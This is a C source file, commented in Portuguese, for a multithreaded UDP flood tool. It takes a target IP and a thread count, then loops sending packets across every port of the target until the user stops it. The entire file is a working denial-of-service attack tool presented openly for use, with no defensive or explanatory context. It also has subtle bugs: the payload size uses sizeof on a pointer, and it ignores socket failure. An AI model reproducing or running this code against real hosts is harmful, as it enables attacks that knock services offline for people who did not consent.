#include <stdio.h> 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>

int ativo = 1;

unsigned char * gerarNBytes(size_t numero_bytes) {
	unsigned char * stream = malloc(numero_bytes);
	size_t i;

	for(i = 0; i < numero_bytes; i++) {
		stream[i] = 0;
	}
	return stream;
}

void * ataque(void * ip) {
	int sockfd;

	struct sockaddr_in endereco_alvo;
	unsigned char * bytes = gerarNBytes(1400);
	unsigned long long int total_enviado = 0;
	unsigned short porta = 1;

	if((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
		perror("[-] Erro ao criar socket");
		free(bytes);
	}

	memset( & endereco_alvo, 0, sizeof(endereco_alvo));
	endereco_alvo.sin_family = AF_INET;
	endereco_alvo.sin_addr.s_addr = *(in_addr_t * ) ip;

	while(ativo) {
		endereco_alvo.sin_port = htons(porta);
		sendto(sockfd,(unsigned char * ) bytes, sizeof(bytes), MSG_CONFIRM,(const struct sockaddr * ) & endereco_alvo, sizeof(endereco_alvo));
		total_enviado++;
		porta++;
		if(porta == 65534) {
			porta = 1;
		}

	}
	close(sockfd);
	free(bytes);
	printf("[+] Thread terminada, enviou %llu pacotes.\n", total_enviado);

}

int main(int argc, char **argv) {	
	if(argc != 3){
		printf("Modo de uso:\n");
		printf("%s <ip_alvo> <numero_thread>\n", argv[0]);
		return -1;
	}

	in_addr_t ip = inet_addr(argv[1]);
	int total_thread = atoi(argv[2]), i;
	pthread_t * threads = malloc(total_thread * sizeof(pthread_t));
	int respota;
	for(i = 0; i < total_thread; i++) {
		if(pthread_create( & threads[i], NULL, ataque, & ip)) {
			perror("Erro ao criar thread\n");
			free(threads);
			return -1;
		}
	}

	while(ativo) {
		char buffer[2];
		printf("Digite 1 para terminar: ");
		fgets(buffer, sizeof(buffer), stdin);
		respota = atoi(buffer);
		if(respota == 1) {
			ativo = 0;
			for(i = 0; i < total_thread; i++) {
				pthread_join(threads[i], NULL);

			}
		}
	}

	free(threads);
	return 0;
}

